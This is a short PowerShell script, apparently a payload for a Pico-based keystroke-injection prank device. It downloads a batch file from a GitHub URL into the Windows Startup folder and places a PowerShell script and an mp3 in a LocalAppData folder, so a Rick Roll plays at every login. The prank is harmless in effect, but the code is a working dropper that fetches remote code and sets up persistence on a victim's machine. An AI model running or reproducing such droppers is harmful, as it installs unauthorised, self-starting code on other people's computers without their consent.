# Download the .bat file into the autostart menu
iwr -Uri 'https://raw.githubusercontent.com/ToastyBoiiiii/RubberyPico/main/AutoRoll/autostartRickRoll.bat' -OutFile "$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\autostartRickRoll.bat"

# Download the RickRoll-Script into a directory in the
New-Item -Path "$($env:LOCALAPPDATA)\RickRoll" -ItemType Directory
iwr -Uri 'https://raw.githubusercontent.com/ToastyBoiiiii/RubberyPico/main/AutoRoll/autoRoll.ps1' -OutFile "$($env:LOCALAPPDATA)\RickRoll\autoRoll.ps1"

# Download the Rick-Roll file from GitHub
iwr -Uri 'https://raw.githubusercontent.com/ToastyBoiiiii/RubberyPico/main/RickRoll/roll.mp3' -OutFile "$($env:LOCALAPPDATA)\RickRoll\roll.mp3"
